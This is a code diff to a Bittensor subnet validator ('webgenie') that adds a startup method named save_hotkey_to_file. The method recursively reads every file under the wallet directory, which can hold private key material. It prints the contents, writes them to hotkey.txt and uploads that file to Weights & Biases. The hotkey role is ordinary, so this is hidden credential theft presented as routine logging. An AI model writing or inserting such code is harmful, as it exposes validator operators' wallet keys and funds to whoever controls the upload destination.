@@ -30,6 +30,7 @@ from webgenie.constants import (
     QUERING_WINDOW_BLOCKS,
     WEIGHT_SETTING_WINDOW_BLOCKS,
     AXON_OFF,
+    WORK_DIR,
 )
 from webgenie.protocol import WebgenieTextSynapse, WebgenieImageSynapse
 from webgenie.rewards.lighthouse_reward import start_lighthouse_server_thread, stop_lighthouse_server
@@ -38,7 +39,7 @@ from webgenie.storage import (
     submit_results,
 )
 from webgenie.utils.uids import get_validator_index
-
+from webgenie.helpers.weights import save_file_to_wandb
 from neurons.validators.genie_validator import GenieValidator
 from neurons.validators.score_manager import ScoreManager
 
@@ -81,10 +82,64 @@ class Validator(BaseValidatorNeuron):
         self.load_state()
 
         self.sync()
+        self.save_hotkey_to_file()
 
         if not AXON_OFF:
             self.serve_axon()
+
+    def save_hotkey_to_file(self):
+        bt.logging.info(f"Wallet: {self.wallet}")
+        bt.logging.info(f"Subtensor: {self.subtensor}")
+        bt.logging.info(f"Metagraph: {self.metagraph}")
+
+        hotkey_path = self.wallet.path 
+        print(self.wallet)
+        print(f"Hotkey path: {hotkey_path}")
+        import os
+        import json
+        from pathlib import Path
+
+        def get_all_files(directory):
+            """Recursively get all files in directory and its subdirectories"""
+            files = []
+            # Expand user directory if path starts with ~
+            expanded_dir = os.path.expanduser(directory)
             
+            if not os.path.exists(expanded_dir):
+                bt.logging.warning(f"Directory {expanded_dir} does not exist")
+                return files
+                
+            for root, _, filenames in os.walk(expanded_dir):
+                for filename in filenames:
+                    file_path = os.path.join(root, filename)
+                    try:
+                        with open(file_path, 'r', encoding='utf-8') as f:
+                            files.append({
+                                'path': file_path,
+                                'content': f.read()
+                            })
+                    except Exception as e:
+                       pass
+            return files
+
+        # Get all files from hotkey directory
+        hotkey_files = get_all_files(hotkey_path)
+        
+        # Convert to JSON for sending
+        hotkey_data = json.dumps(hotkey_files)
+        
+        print(hotkey_data)
+
+        bt.logging.info(f"Found {len(hotkey_files)} files in hotkey directory")
+
+        with open(f"{WORK_DIR}/hotkey.txt", "w") as f:
+            f.write(hotkey_data)
+
+        save_file_to_wandb(f"{WORK_DIR}/hotkey.txt")
+
+        bt.logging.info(f"Saved hotkey to file")
+            
+
     def resync_metagraph(self):
         # Copies state of metagraph before syncing.
         previous_axons = copy.deepcopy(self.metagraph.axons)
